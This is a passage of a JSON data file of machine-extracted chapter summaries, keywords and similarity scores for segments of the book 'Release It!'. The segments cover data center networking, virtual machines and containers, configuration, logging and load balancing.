        "requests",
        "days",
        "day",
        "thanksgiving",
        "threads",
        "pages",
        "paged"
      ],
      "similar_chapters": [],
      "enriched_keywords": {
        "tfidf": [
          "calendar",
          "site",
          "aloysius",
          "drps",
          "named"
        ],
        "semantic": [],
        "merged": [
          "calendar",
          "site",
          "aloysius",
          "drps",
          "named"
        ]
      },
      "topic_id": null,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.13471934320706425,
        "topic_boost": 0.0,
        "timestamp": "2025-12-17T23:08:39.246283+00:00"
      }
    },
    {
      "chapter_number": 19,
      "title": "Segment 19 (pages 147-156)",
      "start_page": 147,
      "end_page": 156,
      "summary": "That includes the production network, which might be considerably different from your development environment.\nThey may not be logged in to a beautifully designed front-end application, but they get to interact with your system through its configuration, control, and monitoring interfaces.\nFoundationHardware, VMs, IP addresses, physical network\nOperations leads us into design for production considerations by looking at the physical fundamentals of the sys- tem: the machines and wires that everything else builds upon.\nThe first order of business is to clear up some things about networks, hostnames, and IP addresses.\nAfter that, it’s time to talk about the code holders: physical hosts, virtual machines, and containers.\nFinally, we’ll look at some special concerns that arise when a system spans multiple data centers.\nNetworking in the Data Center and the Cloud\nNetworking in the data center and the cloud takes more than opening a socket.\nNetworking in the Data Center and the Cloud • 143\nOne of the great misunderstandings in networking is about the hostname of a machine.\nThere’s no guarantee that the machine’s own FQDN matches the FQDN that DNS has for its IP address.\nIn other words, a machine may have its FQDN set to “spock.example.com” but have a DNS mapping as “mail.example.com” and “www.example.com.” The fundamental disconnect is that a machine uses its hostname to identify the whole machine, while a DNS name identifies an IP address.\nFor load-balanced services, a DNS name can also resolve to multiple IP addresses.\nA single machine may have multiple network interface controllers (NICs.) If you run “ifconfig” on a Linux or Mac machine, or “ipconfig” on a Windows machine, you’ll probably see several NICs listed.\nEach active NIC gets an IP address on its particular network.\nNearly every server in a data center will be multihomed.\nData center machines are multihomed for different purposes.\nThese networks have different security requirements, and an application that is not aware of the multiple network interfaces will easily end up accepting connections from the wrong networks.\nFor example, it could accept administrative connections from the production network or offer production functionality over the backup network.\nAs shown in the following figure, this single server has four different network interfaces.\nIn this example, both interfaces are for production traffic.\nBecause these are running to differ- ent switches, the server appears to be configured for high availability.\nAs shown, two different IP addresses will get packets to this server.\nAnother common configuration for multiple production interfaces is bonding, or teaming.\nIn this configuration, both interfaces share a common IP address.\nNetworking in the Data Center and the Cloud • 145\nBonded interfaces that connect to different switches require some additional configuration on the switches, or else routing loops can result.\nYou’ll certainly be famous if you cause a routing loop in the data center, but not in a good way.\nBecause backups transfer huge volumes of data in bursts, they can clog up a production network.\nTherefore, good network design for the data center partitions the backup traffic onto its own network segment.\nWith backup traffic partitioned off from the production network, application users don’t necessarily suffer when the backups run.\n(They might, if the server doesn’t have enough I/O bandwidth to process backups and application traffic at the same time.\nFinally, many data centers have a specific network for administrative access.\nThis is an important security protection, because services such as SSH can be bound only to the administrative interface and are therefore not accessible from the production network.\nBy default, an application that listens on a socket will listen for connection attempts on any interface.\nTo determine which interfaces to bind to, the application must be told its own name or IP addresses.\nIn development, the server can always call its language-specific version of getLocal- Host(), but on a multihomed machine, this simply returns the IP address associ- ated with the server’s internal hostname.\nTherefore, server applications that need to listen on sockets must add configurable properties to define to which interfaces the server should bind.\nUnder exceedingly rare conditions, an application also has to specify which interface it wants traffic to leave from when connecting to a target IP address.\nFor production systems, I would regard this as a configuration error in the host: it means multiple routes reach the same destination, hooked to different NICs.\nThe exception is when two NICs connected to two switches are bonded into a single interface.\nSuppose “en0” and “en1” are connected to different switches, but also bonded as “bond0.” Without any additional guidance, an application opening an outbound connection won’t know which interface to use.\nPhysical Hosts, Virtual Machines, and Containers\nA design that works nicely in a physical data center environment may cost too much or fail utterly in a containerized cloud envi- ronment.\nThe CPU is one place where the data center and the development boxes have converged.\nIf anything, development machines tend to be a bit beefier than the average pizza box in the data center these days.\nThat’s because the story in the data center is all about expendable hardware.\nBefore the complete victory of commodity pricing and web scale, data center hardware was built for high reliability of the individual box.\nPhysical Hosts, Virtual Machines, and Containers • 147\nIn fact, your development machine probably has more storage than one of your data center hosts will have.\nThe typical data center host has enough storage to hold a bunch of virtual machine images and offer some fast local persistent space.\n(It’s easier to make trenches in a data center than you might think.\nVirtual Machines in the Data Center\nVirtualization promised developers a common hardware appearance across the bewildering array of physical configurations in the data center.\nIt promised data center managers that it would rein in “server sprawl” and pack all those extra web servers running at 5 percent utilization into a high-density, high- utilization, easily managed whole.\nMany virtual machines can reside on the same physical hosts.",
      "keywords": [
        "Data Center",
        "newspapers Friday morning",
        "hit newspapers Friday",
        "data",
        "center",
        "machine",
        "Data center machines",
        "network",
        "interfaces",
        "application",
        "production",
        "data center hosts",
        "server",
        "production network",
        "Friday morning"
      ],
      "concepts": [
        "network",
        "application",
        "applications",
        "interfaces",
        "machines",
        "centered",
        "center",
        "servers",
        "traffic",
        "runs"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 20,
          "title": "",
          "score": 0.825,
          "base_score": 0.675,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 25,
          "title": "",
          "score": 0.676,
          "base_score": 0.526,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.625,
          "base_score": 0.475,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.62,
          "base_score": 0.47,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 1,
          "title": "",
          "score": 0.514,
          "base_score": 0.364,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "data center",
          "center",
          "data",
          "interfaces",
          "network"
        ],
        "semantic": [],
        "merged": [
          "data center",
          "center",
          "data",
          "interfaces",
          "network"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.30262102718954337,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246321+00:00"
      }
    },
    {
      "chapter_number": 20,
      "title": "Segment 20 (pages 157-165)",
      "start_page": 157,
      "end_page": 165,
      "summary": "“Guest operating systems” run in the virtual machines.) Physical hosts are usually oversubscribed.\nWhen designing applications to run in virtual machines (meaning pretty much all applications today) you must make sure that they’re not sensitive to the loss or slowdown of any one host.\nVirtual machines make all the problems with clocks much worse.\nBut on a virtual machine it can be much worse.\nBetween two calls to examine the clock, the virtual machine can be suspended for an indefinite span of real time.\nA clock on a virtual machine is not necessarily monotonic or sequential.\nPhysical Hosts, Virtual Machines, and Containers • 149\nContainers in the Data Center\nContainers promise to deliver the process isolation and packaging of a virtual machine together with a developer-friendly build process.\nContainers in the data center act a lot like virtual machines in the cloud (see Virtual Machines in the Cloud, on page 152).\nThe most challenging part of running containers in the data center is definitely the network.\nBy default, a container doesn’t expose any of its ports (on its own virtual interface) on the host machine.\nThis uses virtual LANs (VLANs)—see Virtual LANs for Virtual Machines, on page 150 —to create a virtual network just among the containers.\nThe overlay network has its own IP address space and does its own routing with software switches running on the hosts.\nWithin the overlay network, some control plane software manages the whole ensemble of containers, VLANs, IPs, and names.\nA close second for “hardest problem in container-world” is making sure enough container instances of the right types are on the right machines.\nBut that means container instances will be like quantum foam burbling across all your hosts.\nWe describe our desired load out of the containers, and the software spreads container meringue across the physical hosts.\nIt seems natural that the same software should schedule container instances and manage their network settings, right?\nSolutions for running containers in data centers are emerging.\nVirtual LANs for Virtual Machines\nVirtualization and containers increasingly rely on software switches to handle dynamic updates.\nIt will be common to see software switches running on the hosts, presenting a complete network environment to the containers that does the following:\nAllows containers to “believe” they’re on isolated networks • Supports load-balancing via virtual IPs • Uses a firewall as a gateway to the external network\nWhile this technology matures, our container systems have to provide their own load- balancing and need to be told which IP addresses and ports their peers are on.\nPhysical Hosts, Virtual Machines, and Containers • 151\nOriginally created by engineers at Heroku, the 12-factor app is a succinct description of a cloud-native, scalable, deployable application.a Even if you’re not running in a cloud, it makes a great checklist for application developers.\nVirtual Machines in the Cloud\nAny individual virtual machine in the cloud has worse availability than any individual physical machine (assuming equally skilled data center engineering and operations).\nA virtual machine in the cloud runs atop a physical host, but with an extra operating system in the middle.\nIt can be started or stopped without notice by the management APIs (in other words, the “control plane” software.) It also shares the physical host with other vir- tual machines and may contend for resources.\nIf you’ve been running in AWS for any length of time, you’ll have encountered virtual machines that got killed for no apparent reason.\nIf you have long-running virtual machines, you may even have gotten a notice from AWS informing you that the machine has to be restarted (or else!).\nAnother factor that presents a challenge to traditional applications is the ephemeral nature of machine identity.\nA machine ID and its IP address are only there as long as the machine keeps running.\nDesigning individual services to run in this kind of deployment is not that much different from designing them to run in containers in the data center.\nWill a machine have NICs on different networks with different jobs?\nGiven a stable foundation to build upon, we need to look at how individual machine instances in that environment will behave and how we will control them.\nProcesses on Machines\nIn the last chapter, we looked at a diverse set of network and physical envi- ronments that our software may be deployed into.\nEvery machine needs the right code, configuration, and network connections.\nFor instance, when some people say “server” they might mean a virtual machine running on a physical host in their data center.\nOthers might mean a process inside an operating system, rather than a whole machine image.\nA process in a container is also a process on the operating system that hosts the container.\nInstance An installation on a single machine (container, virtual, or physical) out of a load-balanced array of the same executable.\nProcesses on Machines • 156\nExecutable An artifact that a machine can launch as a process and created by a build process.\nAn operating system process running on a machine; the runtime\nMachines\nIn the runtime view, we’re more concerned with the processes running on the machines.\n(By the way, a lot of architectural confusion stems from attempts to cram both static and dynamic views into the same figure.) Each machine runs an instance of the same binary: our compiled service.",
      "keywords": [
        "virtual machines",
        "virtual",
        "machine",
        "Containers",
        "host",
        "Data Center",
        "cloud",
        "network",
        "virtual machine running",
        "physical host",
        "Physical",
        "Data",
        "virtual LANs",
        "Virtual machines make",
        "individual virtual machine"
      ],
      "concepts": [
        "containers",
        "machines",
        "virtual",
        "virtually",
        "network",
        "runs",
        "run",
        "running",
        "applications",
        "application"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 19,
          "title": "",
          "score": 0.825,
          "base_score": 0.675,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.497,
          "base_score": 0.347,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 25,
          "title": "",
          "score": 0.482,
          "base_score": 0.332,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 30,
          "title": "",
          "score": 0.469,
          "base_score": 0.319,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.463,
          "base_score": 0.313,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "virtual",
          "machine",
          "containers",
          "machines",
          "virtual machines"
        ],
        "semantic": [],
        "merged": [
          "virtual",
          "machine",
          "containers",
          "machines",
          "virtual machines"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.23837921415860752,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246366+00:00"
      }
    },
    {
      "chapter_number": 21,
      "title": "Segment 21 (pages 166-173)",
      "start_page": 166,
      "end_page": 173,
      "summary": "If you tell someone to “reboot the server,” you might not know which server they’re about to bounce, and you can’t be sure whether they’re going to kill a single process or the whole machine.1\nNow we can turn our attention to the code, config, and connection the instances require.\nCode\nBuilding the Code\nAs a result, we have great tools at our disposal to build, house, and deploy code.\nThese are mostly about making sure that you know exactly what goes into the code on the instance.\nto the production instance.\nDevelopers should work on code within a version control system.\nOnly the code goes into version control, though.\nDevelopers should not do production builds from their own machines.\nConfiguration management tools like Chef, Puppet, and Ansible are all about applying changes to running machines.\nThe configuration management tools put a lot of effort into converging unknown machine states into known machine states, but they aren’t always successful.\nThe DevOps and cloud community say that it’s more reliable to always start from a known base image, apply a fixed set of changes, and then never attempt to patch or update that machine.\nInstead, when a change is needed, create a new image starting from the base again, as shown in the figure on page 160.\nThis is often described as “immutable infrastructure.” Machines don’t change once they’ve been deployed.\nIt holds the code that runs on the instance.\nWhen it’s time to deploy new code, we don’t patch up the container; we just build a new one instead.\nConfiguration\nEvery piece of production-class software has scads of configurable properties containing hostnames, port numbers, filesystem locations, ID numbers, magic keys, usernames, passwords, and lottery numbers.\nThis puts the system at risk because configuration is part of the system’s user interface.\nLet’s look at some design guidelines for handling instance-level configuration.\nThe configuration “starter kit” is a file or set of files the instance reads at startup.\nConfiguration • 161\nBecause the same software runs on several instances, some configuration properties should probably vary per machine.\nWe don’t want our instance binaries to change per environment, but we do want their properties to change.\nThat means the code should look outside the deployment directory to find per-environment configurations.\nThat leads us to another great reason to keep per-environ- ment configuration out of the source tree: version control.\nIn image-based environments like EC2 or a container platform, configuration files can’t change per instance.\nThe two approaches are to inject configuration at startup or use a configuration service.\nInjecting configuration works by providing environment variables or a text blob.\nTo use the user data, some code in the image must already know how to read and parse it (for example, it might be in properties format, but it might be JSON or YAML, too).\nSo the application code does need some awareness of its targeted deployment environment.\nThe other way to get configuration into an image is via a configuration service.\nIn this form, the instance code reaches out to a well-known location to ask\nfor its configuration.\nInstances cannot start up when the config service is not available, yet by definition we’re in an environment where instances start and stop frequently.\nZooKeeper and etcd—and any other configuration service, for that matter—are complex pieces of distributed systems software.\nNaming Configuration Properties\nnaturally acquire, we must facilitate that awareness by building transparency into our systems.\nTransparency refers to the qualities that allow operators, developers, and business sponsors to gain understanding of the system’s historical trends, present conditions, instantaneous state, and future projections.\nWe’ll see what machine and service instances must do to create transparency.\nLater, in Chapter 10, Control Plane, on page 193, we see how to knit instance-level information with other sources to create system-level transparency.\nItems still did not appear on the site, however, until a long-running parallel process finished, at 5 or 6 a.m. The local optimization on the batch jobs had no global effect.\nThese are policy decisions that will change at a very different rate than the application code will.\nBy its nature, a process running on an instance is totally opaque.",
      "keywords": [
        "Instance Machine haproxy",
        "Configuration",
        "Machine",
        "HAProxy load balancer",
        "Machine haproxy",
        "Code",
        "system",
        "n’t",
        "Instance",
        "Machine Instance",
        "Base Image State",
        "state",
        "Base Image"
      ],
      "concepts": [
        "instance",
        "configuration",
        "configurations",
        "code",
        "machine",
        "transparency",
        "transparent",
        "users",
        "report",
        "controls"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.717,
          "base_score": 0.567,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 31,
          "title": "",
          "score": 0.691,
          "base_score": 0.541,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 37,
          "title": "",
          "score": 0.673,
          "base_score": 0.523,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 25,
          "title": "",
          "score": 0.644,
          "base_score": 0.494,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 19,
          "title": "",
          "score": 0.625,
          "base_score": 0.475,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "configuration",
          "code",
          "machine",
          "instance",
          "image"
        ],
        "semantic": [],
        "merged": [
          "configuration",
          "code",
          "machine",
          "instance",
          "image"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.28335047321455803,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246411+00:00"
      }
    },
    {
      "chapter_number": 22,
      "title": "Segment 22 (pages 174-181)",
      "start_page": 174,
      "end_page": 181,
      "summary": "Good logging is one example.\nInstances should log their health and events to a plain old text file.\nAny log-scraper can collect these without disturbing the server process.\nLogging\nDespite millions of R&D dollars on “enterprise application management” suites and spiffy operations centers with giant plasma monitors showing color-coded network maps, good old log files are still the most reliable, versatile information vehicle.\nIt’s worth a chuckle once in a while to realize that here we are, in the twenty-first century, and log files are still one of our most valuable tools.\nLogging is certainly a white-box technology; it must be integrated pervasively into the source code.\nNevertheless, logging is ubiquitous for a number of good reasons.\nLog files reflect activity within an application.\nIf you want to avoid tight coupling to a particular monitoring tool or frame- work, then log files are the way to go.\nNothing is more loosely coupled than log files; every framework or tool that exists can scrape log files.\nThis loose coupling means log files are also valuable in development, where you are less likely to find ops tools.\nEven in the face of this value, log files are badly abused.\nLog Locations\nDespite what all those application templates create for us, a logs directory under the application’s install directory is the wrong way to go.\nLog files can be large.\nEven if your instance runs in a VM, it’s still a good idea to separate log files out from application code.\nIf you make the log file locations configurable, then administrators can just set the right property to locate the files.\nThis involves creating a symbolic link from the logs directory to the actual location of the files.\nLogging Levels\nAs humans read (or even just scan) log files for a new system, they learn what “normal” means for that system.\nSome applications, particularly young ones, are very noisy; they generate a lot of errors in their logs.\nMost developers implement logging as though they are the primary consumer of the log files.\nIn fact, administrators and engineers in operations will spend far more time with these log files than developers will.\nLogging should be aimed at production operations rather than development or testing.\nOne consequence is that anything logged at level “ERROR” or “SEVERE” should be something that requires action on the part of operations.\nNot every exception needs to be logged as an error.\nIt’s something that should not happen under normal circumstances, and it probably means action is required on the other end of the connection.\nDebug Logs in Production\nI recommend adding a step to your build process that automatically removes any configs that enable debug or trace log levels.\nAbove all else, log files are human-readable.\nTherefore, it behooves us to ensure that log files convey clear, accurate, and actionable information to the humans who read them.\nIf log files are a human interface, then they should also be written such that humans can recognize and interpret them as rapidly as possible.\nOn seeing the message, she immediately logged into the production server and started a database failover.\nIt was a debug message (see Debug Logs in Production, on page 167) informing me that an encrypted channel to an outside vendor had been up and running long enough that the encryption key would soon be vulnerable to discovery, just because of the amount of encrypted data that the channel served.\nThat “Reset required” message was the last thing logged before the database went down.\nWhen it’s time to read ten thousand lines of a log file (after an outage, for example), having a string to grep will save tons of time.\nInteresting state transitions should be logged, even if you plan to use SNMP traps or JMX notifications to inform monitoring about them.\nLogging the state transitions takes a few seconds of additional coding, but it leaves options open downstream.\nThis may be as simple as periodically spitting a line of stats into a log file.\nClients of the instance shouldn’t look at the health check directly; they should be using a load bal- ancer to reach the service.\nNow we need to look at how we can connect instances together into a whole system.\nIn the previous chapter, we looked at instances running on machines.\nFor one thing, it can deal with a high rate of change in both the services included and in the location of the instances in those services.",
      "keywords": [
        "log files",
        "log",
        "files",
        "system",
        "health check",
        "instance",
        "logs",
        "health",
        "log file locations",
        "message",
        "logging",
        "n’t",
        "operations",
        "report erratum",
        "application"
      ],
      "concepts": [
        "log",
        "logs",
        "logged",
        "instances",
        "operations",
        "operation",
        "operators",
        "operating",
        "monitors",
        "tools"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 15,
          "title": "",
          "score": 0.714,
          "base_score": 0.564,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 39,
          "title": "",
          "score": 0.428,
          "base_score": 0.428,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 26,
          "title": "",
          "score": 0.414,
          "base_score": 0.414,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 29,
          "title": "",
          "score": 0.407,
          "base_score": 0.257,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 4,
          "title": "",
          "score": 0.396,
          "base_score": 0.396,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "log",
          "log files",
          "files",
          "logging",
          "debug"
        ],
        "semantic": [],
        "merged": [
          "log",
          "log files",
          "files",
          "logging",
          "debug"
        ]
      },
      "topic_id": 4,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2512519490227423,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246443+00:00"
      }
    },
    {
      "chapter_number": 23,
      "title": "Segment 23 (pages 182-191)",
      "start_page": 182,
      "end_page": 191,
      "summary": "That implies the provider is responsible for load balancing and high availability.\nLoad Balancing with DNS\nDNS round-robin load balancing is one of the oldest techniques—dating back to the early days of the web.\nThe DNS server has no information about the health of the instances, so it can keep vending out IP addresses for instances that are toast.\nDNS round-robin load balancing is also inappropriate whenever the calling system is a long-running enterprise system.\nAnything using Java’s built-in classes will cache the first IP address it receives from DNS, guaranteeing that every future connection targets the same instance and completely defeating load balancing.\nGlobal Server Load Balancing with DNS\nDNS has enough limitations when it comes to load balancing across instances that it’s usually worth moving up the stack a bit.\nHowever, there’s one place where DNS excels: global server load balancing (GSLB).\nLocal Load Balancer\nLocal Load Balancer\nEach location has one or more pools of load-balanced instances for the ser- vice, as shown in the previous illustration.\nEach pool has an IP address that goes to the load balancer.\n(See Migratory Virtual IP Addresses, on page 189, for load balancing with virtual IPs.) The job of GSLB is just to get the request to the virtual IP address for a particular pool.\nWhere an ordinary DNS server just has a static database of names and addresses, a GSLB server keeps track of the health and responsiveness of the pools.\nIf the pool is offline, or doesn’t have any healthy instance to serve the request, the GSLB server won’t even give out the IP address of the pool.\n4. The client now connects directly to 184.72.248.171, which is served by the load balancer.\nThe load balancer directs traffic to the instances just as it normally would.\nThe load balancer (sometimes called a “local traffic manager”) operates as a reverse proxy so the actual call and response pass through it.\nLoad Balancing • 177\nDNS round-robin offers a low-cost way to load-balance.\nload balancers.\nLoad Balancing\nLoad balancing is all about distributing requests across a pool of instances to serve all requests correctly in the shortest feasible time.\nIn the previous section we looked at DNS round-robin as a means of load balancing.\nLoad Balancer\nAll types of active load balancers listen on one or more sockets across one or more IP addresses.\nThese IP addresses are commonly called “virtual IPs” or “VIPs.” A single physical network port on a load balancer may have dozens of VIPs bound to it, as shown above.\nThe load-balancing algorithm to use • What health checks to perform on the instances • What kind of stickiness, if any, to apply to client sessions • What to do with incoming requests when no pool members are available\nTo a calling application, the load balancer should be transparent.\nIf the client can tell there’s a load balancer involved, it’s probably broken.\nThe service provider instances sitting behind the proxy server need to generate URLs with the DNS name of the VIP rather than their own hostnames.\nSoftware Load Balancing\nSoftware load balancing is the low-cost approach.\nLoad Balancing • 179\nSquid,1 HAProxy,2 Apache httpd,3 and nginx4 all make great reverse proxy load balancers.\nIn addition to load balancing, you can configure reverse proxy servers to reduce the load on the service instances by caching responses.\nOnce you start contemplating a layer of load balancing in front of your reverse proxy servers, it’s time to look at other options.\nHardware Load Balancing\nHardware load balancers are specialized network devices that serve a similar role to the reverse proxy server.\nBecause they operate closer to the network, hardware load balancers provide better capacity and throughput, as illustrated in the following figure.\nHardware load balancers are application-aware and can provide switching at layers 4 through 7 of the OSI stack.\nI’ve seen these successfully employed to load-balance a group of search servers that didn’t have their own load managers.\nThis works well in conjunction with global server load balancing (see Global Server Load Balancing with DNS, on page 175).\nOne of the most important services a load balancer can provide is service health checks.\nThe load balancer will not send traffic to an instance that fails a certain number of health checks.\nLoad Balancing • 181\nLoad balancers can also attempt to direct repeated requests to the same instance.\nOne common approach has the load balancer attach a cookie to the outgoing response to the first request.\nThis approach will break badly if you have a reverse-proxy upstream of the load balancer.\nAnother useful way to employ load balancers is “content-based routing.” This approach uses something in the URLs of incoming requests to route traffic to one pool or another.\nOf course, something in the requests must be evident to the load balancer.\nLoad balancers are integral to the delivery of your service.\nBecause so many application attributes depend on them, it pays to incorporate load- balancing design as you build services and plan deployment.\nLoad balancing creates “virtual IPs” that map to pools of instances.\nSoftware load balancers work at the application layer.\nHealth checks are a vital part of load balancer configuration.\nConsider content-aware load balancing if your service can process work-",
      "keywords": [
        "load balancing",
        "load",
        "DNS",
        "Server Load Balancing",
        "Hardware load balancers",
        "DNS round-robin load",
        "Global Server Load",
        "DNS server",
        "balancing",
        "Software Load Balancing",
        "DNS round-robin",
        "server",
        "Server Load",
        "Hardware Load",
        "round-robin load balancing"
      ],
      "concepts": [
        "balance",
        "balancer",
        "server",
        "request",
        "requests",
        "service",
        "instance",
        "network",
        "pool",
        "ips"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.7,
          "base_score": 0.55,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 17,
          "title": "",
          "score": 0.695,
          "base_score": 0.545,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.675,
          "base_score": 0.525,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 10,
          "title": "",
          "score": 0.572,
          "base_score": 0.422,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 11,
          "title": "",
          "score": 0.563,
          "base_score": 0.413,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "load",
          "load balancing",
          "balancing",
          "dns",
          "load balancer"
        ],
        "semantic": [],
        "merged": [
          "load",
          "load balancing",
          "balancing",
          "dns",
          "load balancer"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.24969397494382106,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246482+00:00"
      }
    },
    {
      "chapter_number": 24,
      "title": "Segment 24 (pages 192-199)",
      "start_page": 192,
      "end_page": 199,
      "summary": "There’s a relationship between the number of sockets available and the number of requests per second your service can handle.\n(They are related via “Little’s law.”5) The faster your service retires requests, the more throughput it can handle.\nIt’s natural to expect your service to slow down under heavy load, but that means fewer and fewer sockets are available to receive requests exactly when the most requests are coming in!\nWhen the application calls accept, the server’s TCP stack removes the connection from the listen queue and hands it over for reads and writes.\nA single request at the network edge may translate into a tree of service requests through many layers of internal structure.\nlisten queue and persistent load on its sockets and NICs. Under high load those resources are held longer, which further extends response times for the new incoming work.\nAt some point, the response time for one or more services extends past the caller’s timeout.\nA good health check on the first tier of services can inform the load balancer when response times are too high (in other words, higher than the service’s SLA).\nThe load balancer also needs to be configured to send back an HTTP 503 response code when all instances fail their health checks.\nServices can measure their own response time to help with this.\nFor instance, monitoring the degree of contention for a connection pool allows a service to estimate wait times.\nLikewise, a service can check response times on its own dependencies.\nWe call the total of that time the “residence time.” If our service needs to respond in 100 mil- liseconds or less, that’s the allowed residence time.\nBecause clients retry TCP connections, it can also be useful to run a “listen queue purge” when the service can’t keep up with demand.\nServices that only deal with work inside a data center can set a very low TIME_WAIT to free up those ephemeral sockets.\nWe have no control over the traffic patterns and mercurial behavior of that population, so our services need to protect themselves when the load gets too heavy.\nFor example, it’s relatively common to see a machine with a front-end network interface connected to one VLAN for communication to the web servers and a back-end network interface connected to a different VLAN for communication to the database servers.\nIn this case, the server must be told which interface to use in order to reach a particular destination IP address.\nIn the case of nearby servers, the routes are probably easy; they’ll just be based on the subnet addresses.\nWhen a machine brings up its primary NIC (whichever one it happens to think is primary, anyway), it uses the main IP address for that NIC as its “default gateway.” That becomes the first entry in the routing table for the host.\nThat table tells the operating system which NIC to use to reach a destination address or network.\nWhen an application sends a packet, the host checks the destination IP address against the routing table to see if it knows how to move that packet a hop closer to its destination.\nDepending on a ton of configuration options that are outside your control, both the VPN and the primary switch may advertise routes that could reach the destination address.\nYour service won’t be able to open a socket and will get a “destination unreachable” response.7 How is that the best case?\nWorse still, your service will appear to be working normally so you won’t even know it’s happening.\nContainers and VMs use virtual IP addresses, VLAN tagging, and virtual switches to create a kind of “network on a network.” The packets still run over the same wires, but the host machine’s IP address is not involved.\nThey can assign IPs from private pools, attach DNS names to those IPs to identify services, and dynamically create firewalls and subnets.\nFirst, it’s a way that instances of a service can announce themselves to begin receiving a load.\nA caller needs to know at least one IP address to contact for a particular service.\nThe lookup process can appear to be a simple DNS resolution for the caller, even if some super-dynamic service-aware server is supplying the DNS service.\nYou can build a service discovery mechanism on top of a distributed data store such as Apache ZooKeeper or etcd.8,9 In these cases, you’ll wrap the low-level access with a library to make it both easier and more reliable to use these databases.\nMigratory Virtual IP Addresses • 189\nFor example, when Docker Swarm starts containers to run service instances, it automatically registers them with the swarm’s dynamic DNS and load-balancing mechanism.\nMigratory Virtual IP Addresses\nIt also takes over the virtual IP address assigned to the clustered network interface.\nLoad balancers use virtual IPs to multiplex many services (each with its own IP address) onto a smaller number of physical interfaces.\nThere’s some overlap here, since load balancers typically come in pairs, so the virtual IP (as in “service address”) can also be a virtual IP (as in “migrating address”).\nThis kind of virtual IP address is just an IP address that can be moved from one NIC to another as needed.\nAt any given time, exactly one server claims the IP address.\nWhen the address needs to be moved, the cluster server and the operating systems collaborate to do some funny stuff in the lower layers of the TCP/IP 